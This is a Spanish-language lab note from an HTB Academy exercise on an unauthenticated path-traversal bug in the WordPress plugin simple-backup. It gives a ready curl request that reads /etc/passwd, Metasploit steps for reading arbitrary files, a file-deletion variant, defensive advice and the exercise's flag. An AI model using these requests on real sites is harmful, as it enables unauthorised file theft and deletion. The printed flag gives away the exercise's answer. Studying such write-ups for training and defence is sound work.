---
tags:
  - tecnica
  - categoria/explotacion
  - os/agnostico
  - nivel/facil
fecha_aprendida: 2026-09-27
fuente: HTB Academy - Getting Started §9 (Explotaciones Públicas)
---
# ⚔️ WordPress — Arbitrary File Read vía plugin vulnerable (Simple Backup)

> [!abstract] Resumen
> Plugins de WordPress desactualizados exponen endpoints propios sin autenticación. `simple-backup` <= 2.7.11 permite leer/borrar archivos arbitrarios del servidor vía path traversal en el parámetro `download_backup_file`, sin login.

---

## ¿Qué es y por qué funciona?

El core de WordPress puede estar parcheado y aun así el sitio ser vulnerable por un **plugin** desactualizado — hay que enumerar plugins, no solo la versión del core. `simple-backup` registra su propio endpoint en `wp-admin/tools.php?page=backup_manager` y sanea el parámetro `download_backup_file` con `ltrim($filename, "./")` en vez de `basename()`, lo que no bloquea secuencias `../`. Resultado: lectura arbitraria de archivos (y borrado, en otra variante del mismo bug) sin autenticación.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - WordPress con plugin `simple-backup` <= 2.7.11 instalado y activo
> - Configuración por defecto del plugin (sin auth adicional)

---

## Procedimiento

### Detección / Enumeración

```bash
wpscan --url http://<IP>:<PUERTO> --enumerate p,u --api-token <TOKEN>
# Registro gratis del token: https://wpscan.com/register (25 req/día)
searchsploit wordpress simple backup
```

Confirmar versión de WordPress y plugins vía `wpscan`; **no asumir que el vector está en el core** — revisar cada plugin listado contra su CVE.

### Explotación

Manual (path traversal directo):
```bash
curl "http://<IP>:<PUERTO>/wp-admin/tools.php?page=backup_manager&download_backup_file=oldBackups/../../../../../../etc/passwd"
```

Vía Metasploit (más confiable, maneja el DEPTH del traversal):
```bash
msfconsole
search Simple Backup
use auxiliary/scanner/http/wp_simple_backup_file_read
set RHOSTS <IP>
set RPORT <PUERTO>
set FILEPATH /etc/passwd        # confirmar primero con un archivo conocido
exploit
# Cambiar FILEPATH al archivo objetivo real y volver a correr exploit
set FILEPATH /flag.txt
exploit
# El módulo guarda el contenido leído en un loot:
cat /home/kali/.msf4/loot/<archivo_generado>.txt
```

> [!tip] Variaciones comunes
> - Mismo bug permite **borrado** arbitrario vía `delete_backup_file` (DoS/sabotaje, no solo lectura).
> - Si el módulo `check` no existe o no aplica, no asumir que el target no es vulnerable — probar `exploit` directo.

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| `wpscan` | Enumera plugins/temas/usuarios de WordPress | `wpscan --url <URL> --enumerate p,u` |
| `searchsploit` | Busca PoCs públicos por nombre de plugin | `searchsploit <plugin>` |
| `auxiliary/scanner/http/wp_simple_backup_file_read` (msf) | Automatiza el path traversal y guarda el resultado en loot | `set FILEPATH <archivo>; exploit` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Mantener plugins actualizados o eliminarlos si no se usan; el bug real es sanear rutas con `basename()` en vez de `ltrim()`. Monitorear requests a `wp-admin/tools.php` con parámetros de traversal (`../`) como indicador de explotación.

---

## Dónde la usé

- HTB Academy — Getting Started, Sección 9 (Explotaciones Públicas) — flag: `HTB{my_f1r57_h4ck}`

---

## Referencias

- [Exploit-DB — WordPress simple-backup plugin - Multiple vulnerabilities](https://www.exploit-db.com/exploits/39909)
- [CVE-2016-20076](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-20076)
- [MITRE ATT&CK - T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/techniques/T1190/)
